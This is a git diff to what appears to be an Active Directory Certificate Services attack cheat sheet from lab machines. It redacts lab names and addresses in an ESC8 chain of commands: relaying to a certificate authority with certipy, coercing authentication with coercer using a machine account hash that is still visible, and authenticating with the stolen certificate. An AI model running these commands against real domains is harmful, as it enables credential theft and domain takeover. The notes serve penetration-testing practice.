@@ -57,13 +57,13 @@ ntpdate -q 10.10.11.236
 faketime '2024-12-19 08:12:01' certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236
 ```
 ### ESC8
-Tested on Ifrit-VulnLab
+Tested on XXXXX-XXXXX
 ```
-certipy-ad relay -target 'http://172.16.41.17/'
+certipy-ad relay -target 'http://172.16.XX.XX/'
 
-coercer coerce -u SQL07$@it-ifrit.vl --hashes :3565f3f4123cfbd6fb880a0978fffc81 -l 10.8.0.158 -t 172.16.41.210 --always-continue
+coercer coerce -u XX$@XXXXX.XX --hashes :3565f3f4123cfbd6fb880a0978fffc81 -l 10.XX.XX.XX -t 172.16.XX.XX --always-continue
 
-certipy-ad auth -pfx FS02.pfx
+certipy-ad auth -pfx XXXX.pfx
 ```
 ### ESC9
 Tested on https://app.hackthebox.com/machines/Certified
